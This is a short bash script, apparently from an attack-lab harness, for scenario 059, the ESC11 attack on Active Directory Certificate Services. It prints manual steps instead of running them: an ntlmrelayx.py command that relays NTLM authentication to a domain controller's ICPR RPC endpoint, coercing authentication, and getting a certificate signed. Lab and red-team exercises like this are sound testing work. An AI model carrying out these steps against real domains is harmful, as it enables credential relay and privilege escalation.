#!/bin/bash
# CONFIGURED—ESC11 ICPR enabled; requires NTLM relay to RPC endpoint
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "059" "ESC11 — NTLM relay to ICertPassage RPC"

log "WT#059 requires NTLM relay to ICPR RPC — see walkthrough doc"
echo "Manual steps:"
echo "  1. ntlmrelayx.py -t rpc://$DC01 -rpc-mode ICPR -smb2support"
echo "  2. Coerce auth from domain-joined machine"
echo "  3. Relay signs certificate request via ICPR"
exit 1
